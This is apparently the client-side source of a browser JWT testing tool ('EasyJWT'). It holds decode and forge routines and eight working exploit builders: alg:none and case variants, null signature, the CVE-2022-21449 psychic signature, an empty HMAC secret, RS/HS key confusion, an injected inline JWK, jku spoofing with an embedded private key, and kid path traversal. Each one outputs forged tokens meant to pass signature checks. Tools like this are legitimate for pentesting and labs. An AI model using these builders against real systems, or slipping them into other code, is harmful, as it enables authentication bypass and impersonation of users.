// Client-side JWT crypto: decode, forge (sign), and the Exploits tab's eight
// attack builders, plus the HMAC primitive the Crack worker also reuses via
// importScripts(). Everything here runs in the browser; nothing it touches
// is sent to the server. Plain script (no ES modules) so the Worker can pull
// it in with importScripts() as-is.
//
// This intentionally mirrors, byte-for-byte where it matters, what the real
// ticarpi/jwt_tool (-X n/b/p/i/k) and this app's own former server-side
// /api/forge and /api/exploit routes used to produce, verified against
// jwt_tool's own source rather than guessed from memory.

// ---------- base64url + UTF-8 helpers ----------
function b64urlEncode(bufOrBytes) {
  const bytes = bufOrBytes instanceof ArrayBuffer ? new Uint8Array(bufOrBytes) : bufOrBytes;
  let bin = "";
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function b64urlToBytes(str) {
  let b64 = str.replace(/-/g, "+").replace(/_/g, "/");
  while (b64.length % 4) b64 += "=";
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

function utf8(str) {
  return new TextEncoder().encode(str);
}

function bytesToUtf8(bytes) {
  return new TextDecoder().decode(bytes);
}

function concatBytes(a, b) {
  const out = new Uint8Array(a.length + b.length);
  out.set(a, 0);
  out.set(b, a.length);
  return out;
}

function pemToArrayBuffer(pem) {
  const b64 = pem
    .replace(/-----BEGIN [^-]+-----/, "")
    .replace(/-----END [^-]+-----/, "")
    .replace(/[\r\n]/g, "")
    .trim();
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes.buffer;
}

// ---------- HMAC ----------
// Tries the native WebCrypto path first (fast); falls back to a manual
// RFC 2104 implementation for anything a browser's importKey happens to
// reject, most notably a zero-length key. Two of the Exploits builders
// below (b, t) deliberately sign with an empty-string secret, so this has
// to work for that case the same as it does for a real wordlist candidate.
async function hmacSign(hashName, keyBytes, msgBytes) {
  try {
    const key = await crypto.subtle.importKey("raw", keyBytes, { name: "HMAC", hash: hashName }, false, ["sign"]);
    return new Uint8Array(await crypto.subtle.sign("HMAC", key, msgBytes));
  } catch (err) {
    return hmacSignManual(hashName, keyBytes, msgBytes);
  }
}

async function hmacSignManual(hashName, keyBytes, msgBytes) {
  const blockSize = hashName === "SHA-256" ? 64 : 128; // SHA-384/512 share a 128-byte block size
  let key = keyBytes;
  if (key.length > blockSize) {
    key = new Uint8Array(await crypto.subtle.digest(hashName, key));
  }
  if (key.length < blockSize) {
    const padded = new Uint8Array(blockSize);
    padded.set(key);
    key = padded;
  }
  const iPad = new Uint8Array(blockSize);
  const oPad = new Uint8Array(blockSize);
  for (let i = 0; i < blockSize; i++) {
    iPad[i] = key[i] ^ 0x36;
    oPad[i] = key[i] ^ 0x5c;
  }
  const inner = new Uint8Array(await crypto.subtle.digest(hashName, concatBytes(iPad, msgBytes)));
  return new Uint8Array(await crypto.subtle.digest(hashName, concatBytes(oPad, inner)));
}

// ---------- Decode ----------
function decodeTokenClient(token) {
  const parts = token.split(".");
  if (parts.length < 2) {
    throw new Error("That does not look like a JWT, expected at least two dot separated parts");
  }
  let header, payload;
  try {
    header = JSON.parse(bytesToUtf8(b64urlToBytes(parts[0])));
    payload = JSON.parse(bytesToUtf8(b64urlToBytes(parts[1])));
  } catch (err) {
    throw new Error("Could not decode token: " + err.message);
  }
  return {
    header: JSON.stringify(header, null, 2),
    payload: JSON.stringify(payload, null, 2),
    signature: parts.length > 2 ? parts[2] : "",
  };
}

// ---------- Forge ----------
// Same "typ" rule PyJWT's own header-merging used to apply for us, worked
// out empirically (not guessed) against the real library: a header that
// already has a "typ" key keeps whatever it is; otherwise "JWT" gets added
// only if Add typ header is checked, and it's left out entirely otherwise.
function resolveTyp(header, addTyp) {
  if (!("typ" in header) && addTyp) {
    header.typ = "JWT";
  }
}

function hashNameForAlg(alg) {
  if (alg.includes("256")) return "SHA-256";
  if (alg.includes("384")) return "SHA-384";
  return "SHA-512";
}

function curveForAlg(alg) {
  if (alg.includes("256")) return "P-256";
  if (alg.includes("384")) return "P-384";
  return "P-521";
}

function saltLengthForAlg(alg) {
  if (alg.includes("256")) return 32;
  if (alg.includes("384")) return 48;
  return 64;
}

async function importPrivateKeyForAlg(pem, alg) {
  const der = pemToArrayBuffer(pem);
  let algParams;
  if (alg.startsWith("rs")) algParams = { name: "RSASSA-PKCS1-v1_5", hash: hashNameForAlg(alg) };
  else if (alg.startsWith("ps")) algParams = { name: "RSA-PSS", hash: hashNameForAlg(alg) };
  else algParams = { name: "ECDSA", namedCurve: curveForAlg(alg) };
  return crypto.subtle.importKey("pkcs8", der, algParams, false, ["sign"]);
}

async function signAsym(alg, key, data) {
  if (alg.startsWith("ps")) {
    return crypto.subtle.sign({ name: "RSA-PSS", saltLength: saltLengthForAlg(alg) }, key, data);
  }
  if (alg.startsWith("es")) {
    return crypto.subtle.sign({ name: "ECDSA", hash: hashNameForAlg(alg) }, key, data);
  }
  return crypto.subtle.sign({ name: "RSASSA-PKCS1-v1_5" }, key, data);
}

async function forgeToken({ headerJson, payloadJson, signAlg, secret, privateKeyPem, addTyp }) {
  let header, payload;
  try {
    header = JSON.parse(headerJson);
  } catch (err) {
    throw new Error(`Header is not valid JSON: ${err.message}`);
  }
  try {
    payload = JSON.parse(payloadJson);
  } catch (err) {
    throw new Error(`Payload is not valid JSON: ${err.message}`);
  }
  if (typeof header !== "object" || header === null || Array.isArray(header)) {
    throw new Error("Header must be a JSON object");
  }
  if (typeof payload !== "object" || payload === null || Array.isArray(payload)) {
    throw new Error("Payload must be a JSON object");
  }

  if (!signAlg) {
    if (addTyp && !("typ" in header)) header.typ = "JWT";
    if (!("alg" in header)) header.alg = "none";
    const headerB64 = b64urlEncode(utf8(JSON.stringify(header)));
    const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
    return `${headerB64}.${payloadB64}.`;
  }

  if (signAlg.startsWith("hs")) {
    resolveTyp(header, addTyp);
    header.alg = signAlg.toUpperCase();
    const headerB64 = b64urlEncode(utf8(JSON.stringify(header)));
    const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
    const signingInput = `${headerB64}.${payloadB64}`;
    const sig = await hmacSign(hashNameForAlg(signAlg), utf8(secret || ""), utf8(signingInput));
    return `${signingInput}.${b64urlEncode(sig)}`;
  }

  if (!privateKeyPem) {
    throw new Error("This algorithm needs a private key");
  }
  resolveTyp(header, addTyp);
  header.alg = signAlg.toUpperCase();
  const headerB64 = b64urlEncode(utf8(JSON.stringify(header)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const signingInput = `${headerB64}.${payloadB64}`;
  try {
    const key = await importPrivateKeyForAlg(privateKeyPem, signAlg);
    const sig = await signAsym(signAlg, key, utf8(signingInput));
    return `${signingInput}.${b64urlEncode(sig)}`;
  } catch (err) {
    throw new Error(`Could not build the token: ${err.message || err}`);
  }
}

// ---------- Exploits ----------
// EasyJWT's own fixed keypair, used only to self-sign a token for the Spoof
// JWKS exploit (-X s) so a forged token verifies against the matching
// public half served from /jwks.json. Not a secret: it's baked into every
// copy of EasyJWT (server source and this file alike) for exactly that
// reason, same key this app has always shipped.
const DEFAULT_JWKS_PRIVATE_KEY_PEM = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDj/Ff91kLspLjP
8L4UefVBr8KwUEtNpGccbgA1GZGRrBJ3bIzXwyQCY5q+Ux4tw1E4QizhVEgRD09t
x8/1cGJH6/TfR6IBNqCQY1zxGaLxN9XaDmVrioeX2NAVv62ppIb/6Hvbpne4L5Or
GhMzLkoN06+vAuETxZh/J3f0993Vx52KjGNR5h/HRQJK9ZXMDRQb0GiIoDuYsKG/
Kx5aR3IYa1kNgj2jlE3Dzp6GEZzdjgN44ZdHSodoPCp5r9gN7kylWN8YFsWXXOxC
5RV9hzI5GO2LwosUiGQ4Z14iqH1OfKfXGkovsP+RVeQln0Zyg+q6lyivKy6CK91a
iXKxb4wDAgMBAAECggEATdqigcBlYkJuCjR/9KYhJqlKpsMEtCLsQz0dPQTaPRCx
za53+kZdSaOR+GSR7bbBSaDvipMpeQntaePOFFaoeT8OhCEGJbvt4ODNoFfM2Ork
UG6SG8NWwnf7tzGZsFDK+SD/CucyAufcWZWx8Mxh5Y7gc7db/VCA3wsvX6w1SQcY
rhpOTYIMUBLAT0a8gt74kCuoghmET21Nptt1yA5jiJel5L+OxtMVQlvBTlmApwQc
VawxC2+RTHYXfWWw7jwMKoORIPYq7O9nHvDvrTfOmfkG7shjQsMdFkt2l4QiqSAj
EA2fCcTTgGUL053SATqUu52QQTQGlODWH7N0hV33wQKBgQD3QJh/JKNZWtZXVLXn
WBPCBkEhj2/JWytRb2P+GmoWJothSccp+dfUQQ798HNxZAuJTCTT9PSeD9ZfKVIO
XxI4vJZtWnsH3F8sTmAyhrRUIdTbTv9TO7TiGI28Fk6jS9HZ53hVlkN+n+Wi8ORD
Fpl/pPAt0eimhK5PiQIgcPPJyQKBgQDsDT9KiH4ZQwjbtrSuBdjjACTMGcocNblT
MT8WsTK+MVi7o0YWG0d6UV39Wg7sAZ9bLZnGZDgGZkS2ut7tjlEL07cZ4n670ai8
c3F02kdFS0sy3OnP5qmwmHRSK+QNj+Gd787OTyswoP6kZUIEmvWm0M9t0LhC+ynh
FjBiTXMNawKBgCrBk91gs5KvH6OodXBVDc2ekULBcB5M0rfZYFw/qxq7fZzMSlGa
79S3j2UgYIY6O7h5X2D72hU/Pd3k4liz3g3LpuOwIthgJmEeCIqUOrjVxN5L0eFN
0ODMSC4/WUfpw5c/7NI4EuHhuq8rov1q+g5VsmbqBqZNCWudkK2VesLpAoGBAMPD
DL00S1eJ93u3n0o/QSqpANtfe/U/PM3YppicJhgDdrJOax6ESxgPCOLG4F8rzUvh
mokkri3ofI4Kljzu7Rng4BYQd8gtzUFUgEBHkhnOorOw8BtiEVKKbNWE3uG8dID1
003X7Fqs+eG+tCx7ksRgodZR5a5u+8FXFJNB5eu3AoGBAONKYDa/hdqwIIVFtYwf
VOsizMZNA/25Quvjyf7mZOQ9kx+Xg3B6wbkHijdDzKLVU69mHO2iyFlKFXIgVklG
tMTk3r8lpILN25Eo1xDUmtOvWY5VAWOjL39Ms4kDwzml6utKHeEbSXOpgtn/d0kH
lXEwmkWUVCJ2dFomEEUM7M/u
-----END PRIVATE KEY-----`;

let _defaultSigningKeyPromise = null;
function importDefaultSigningKey() {
  if (!_defaultSigningKeyPromise) {
    _defaultSigningKeyPromise = crypto.subtle.importKey(
      "pkcs8",
      pemToArrayBuffer(DEFAULT_JWKS_PRIVATE_KEY_PEM),
      { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
      false,
      ["sign"]
    );
  }
  return _defaultSigningKeyPromise;
}

// a: alg:none, with optional differently-cased spellings. Ported as-is from
// this app's own previous server-side implementation (not a jwt_tool port).
function exploitAlgNone(header, payload, includeVariants) {
  const variants = includeVariants ? ["none", "None", "NONE", "nOnE", "noNe"] : ["none"];
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const tokens = variants.map((variant) => {
    const h = Object.assign({}, header, { alg: variant });
    const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
    return { label: variant, token: `${headerB64}.${payloadB64}.` };
  });
  const output = includeVariants
    ? 'Re-signed with alg set to "none", plus 4 differently-cased spellings of it, with the signature removed entirely. Some servers only block the exact lowercase string and accept one of the others. For a custom combination of your own, use Forge instead.'
    : 'Re-signed with alg set to "none" and the signature removed entirely. If the server blocks that exact string, tick "Include case variants" and try again, some servers only check for the lowercase spelling.';
  return { output, tokens };
}

// n: null signature (jwt_tool -X n). Keeps the header/payload, including
// whatever alg they already had, and just drops the signature entirely.
function exploitNullSig(header, payload) {
  const headerB64 = b64urlEncode(utf8(JSON.stringify(header)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const token = `${headerB64}.${payloadB64}.`;
  return {
    output: `Signature removed entirely, alg left as "${header.alg}" in the header, untouched. Exploits servers that fail to reject a token with no signature at all.`,
    tokens: [{ token }],
  };
}

// p: psychic signature, CVE-2022-21449 (jwt_tool -X p). jwt_tool always
// forces alg to ES256 and uses this exact fixed signature blob: a DER
// ECDSA SEQUENCE encoding r=0, s=0, which some vulnerable libraries'
// ASN.1 parsers accept as valid for ANY message.
async function exploitPsychicSig(header, payload) {
  const h = Object.assign({}, header, { alg: "ES256" });
  const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const token = `${headerB64}.${payloadB64}.MAYCAQACAQA`;
  return {
    output: 'Re-signed with alg set to "ES256" and a crafted ECDSA signature encoding r=0, s=0, which some vulnerable libraries (CVE-2022-21449) accept as valid for ANY message.',
    tokens: [{ token }],
  };
}

// b: blank password accepted (jwt_tool -X b). Forces alg to HS256 and
// signs with an empty-string secret.
async function exploitBlankPassword(header, payload) {
  const h = Object.assign({}, header, { alg: "HS256" });
  const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const signingInput = `${headerB64}.${payloadB64}`;
  const sig = await hmacSign("SHA-256", new Uint8Array(0), utf8(signingInput));
  return {
    output: 'Re-signed with alg set to "HS256" and an empty-string secret. Tests whether the server has a hard-coded blank/missing signing key.',
    tokens: [{ token: `${signingInput}.${b64urlEncode(sig)}` }],
  };
}

// k: key confusion (jwt_tool -X k -pk). Forces alg to HS256 and signs using
// the given RSA/EC public key's own raw text as the HMAC secret.
async function exploitKeyConfusion(header, payload, pubkeyPem) {
  if (!pubkeyPem) throw new Error("Key confusion needs a public key");
  const h = Object.assign({}, header, { alg: "HS256" });
  const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const signingInput = `${headerB64}.${payloadB64}`;
  const sig = await hmacSign("SHA-256", utf8(pubkeyPem), utf8(signingInput));
  return {
    output: 'Re-signed with alg set to "HS256", using the given RSA/EC public key\'s raw text as the HMAC secret. Exploits servers that use the same key for both verifying RS/ES tokens and HMAC tokens.',
    tokens: [{ token: `${signingInput}.${b64urlEncode(sig)}` }],
  };
}

// i: inject inline JWKS (jwt_tool -X i). jwt_tool reuses one RSA-2048
// keypair it generates once per container and persists; a fresh keypair
// generated per run here is behaviorally identical for the exploit itself
// (the attack only needs ANY attacker-controlled key embedded and used to
// sign, not that specific key), so this generates a new one every time
// rather than needing anywhere to persist it.
async function exploitInjectJwks(header, payload) {
  const keyPair = await crypto.subtle.generateKey(
    { name: "RSASSA-PKCS1-v1_5", modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]), hash: "SHA-256" },
    true,
    ["sign", "verify"]
  );
  const jwk = await crypto.subtle.exportKey("jwk", keyPair.publicKey);
  const h = Object.assign({}, header);
  const hadKid = "kid" in h;
  h.jwk = { kty: "RSA", kid: "jwt_tool", use: "sig", e: jwk.e, n: jwk.n };
  h.alg = "RS256";
  if (hadKid) h.kid = "jwt_tool"; // matches jwt_tool: only renames an existing kid claim, never adds one
  const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const signingInput = `${headerB64}.${payloadB64}`;
  const sig = await crypto.subtle.sign({ name: "RSASSA-PKCS1-v1_5" }, keyPair.privateKey, utf8(signingInput));
  return {
    output: 'Generated a fresh RSA-2048 keypair in your browser, embedded its public half directly in the header\'s "jwk" claim, and signed with the matching private half (alg RS256). Exploits servers that trust a self-contained "jwk" header instead of looking the key up themselves.',
    tokens: [{ token: `${signingInput}.${b64urlEncode(sig)}` }],
  };
}

// s: spoof JWKS. Ported from this app's own previous server-side
// implementation. Always self-signs with EasyJWT's fixed default key; the
// URL only controls where the jku header points, defaulting to this same
// page's own /jwks.json (the client-side equivalent of the old server-side
// "derive the default jku from the current request's host").
async function exploitSpoofJwks(header, payload, jwksUrlInput, kidOverride) {
  const defaultJwksUrl = `${window.location.origin}/jwks.json`;
  const targetJku = jwksUrlInput || defaultJwksUrl;
  const h = Object.assign({}, header);
  h.alg = "RS256";
  h.jku = targetJku;
  if (kidOverride) h.kid = kidOverride;
  const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const signingInput = `${headerB64}.${payloadB64}`;
  const key = await importDefaultSigningKey();
  const sig = await crypto.subtle.sign({ name: "RSASSA-PKCS1-v1_5" }, key, utf8(signingInput));
  const token = `${signingInput}.${b64urlEncode(sig)}`;

  const kidNote = "kid" in h
    ? `kid set to "${h.kid}".`
    : "kid left exactly as it was in the header (Manual was selected), which means no kid at all if the original token didn't have one.";

  const note = jwksUrlInput
    ? `Signed with EasyJWT's built-in default key, jku set to the URL you gave: ${targetJku}, ${kidNote}\nMake sure that URL actually serves a JWKS containing this exact key under that kid (visit ${defaultJwksUrl} yourself and copy its "keys" entry into your JWKS body, or pick it from the kid dropdown above, which fetches from that URL automatically) or the target won't find a matching key to verify this signature.`
    : `No JWKS URL given, so jku points at EasyJWT's own hosted default key (${defaultJwksUrl}). If the target server can't reach that domain, paste your own URL above instead (e.g. a lab's exploit server) and host the same key there yourself, copied from ${defaultJwksUrl}. ${kidNote}`;

  return { output: note, tokens: [{ token }] };
}

// t: kid header path traversal. Ported from this app's own previous
// server-side implementation (not one of jwt_tool's own -X codes there
// either).
async function exploitKidPathTraversal(header, payload, kidPathInput) {
  const path = kidPathInput || "../../../../../../dev/null";
  const h = Object.assign({}, header, { kid: path, alg: "HS256" });
  const headerB64 = b64urlEncode(utf8(JSON.stringify(h)));
  const payloadB64 = b64urlEncode(utf8(JSON.stringify(payload)));
  const signingInput = `${headerB64}.${payloadB64}`;
  const sig = await hmacSign("SHA-256", new Uint8Array(0), utf8(signingInput));
  return {
    output: `kid set to "${path}", signed with alg: HS256 and an empty-string secret, the assumption being that path resolves to an empty (or otherwise predictable) file on the server and it reads that file's contents as the HMAC key. If this doesn't work, the server may store its keys somewhere else, try a different path.`,
    tokens: [{ token: `${signingInput}.${b64urlEncode(sig)}` }],
  };
}

async function runExploit(code, { header, payload, pubkeyPem, jwksUrl, kidOverride, kidPath, noneVariants }) {
  switch (code) {
    case "a":
      return exploitAlgNone(header, payload, noneVariants);
    case "n":
      return exploitNullSig(header, payload);
    case "p":
      return exploitPsychicSig(header, payload);
    case "b":
      return exploitBlankPassword(header, payload);
    case "k":
      return exploitKeyConfusion(header, payload, pubkeyPem);
    case "i":
      return exploitInjectJwks(header, payload);
    case "s":
      return exploitSpoofJwks(header, payload, jwksUrl, kidOverride);
    case "t":
      return exploitKidPathTraversal(header, payload, kidPath);
    default:
      throw new Error(`Unknown exploit code: ${code}`);
  }
}
